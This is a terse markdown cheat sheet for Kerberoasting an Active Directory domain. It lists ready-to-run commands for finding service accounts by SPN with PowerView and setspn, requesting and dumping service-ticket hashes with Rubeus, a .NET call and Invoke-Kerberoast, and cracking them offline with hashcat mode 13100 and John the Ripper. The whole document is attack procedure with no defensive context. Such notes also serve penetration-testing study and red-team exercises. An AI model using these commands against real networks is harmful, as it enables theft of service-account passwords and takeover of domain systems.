# Kerberoast

## Find SPN

### Powerview

```csharp
. .\powerview.ps1
Get-NetUser -SPN
```

### Powershell

```csharp
setspn -T domain -Q */*
```

## Request a TGS

### Rubeus

```csharp
 .\Rubeus.exe kerberoast /outfile:hashes.txt
```

### Powershell

```csharp
Add-Type -AssemblyName system.identitymodel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/lab.domain.local"
```

### Invoke-Kerberoast

```csharp
 Invoke-Kerberoast -OutputFormat John  -ErrorAction SilentlyContinue | ft -HideTableHeaders -AutoSize Hash | Out-File -Width 5000 -Encoding "UTF8" .\roast.txt
 Invoke-Kerberoast -OutputFormat hashcat  -ErrorAction SilentlyContinue | ft -HideTableHeaders -AutoSize Hash | Out-File -Width 5000 -Encoding "UTF8" .\roast.txt
```

## Crack

### Hashcat

```csharp
hashcat -m 13100 hash.txt dic.lst --force
```

### John

```csharp
john --format=krb5tgs --wordlist=dic.lst hash.txt
```

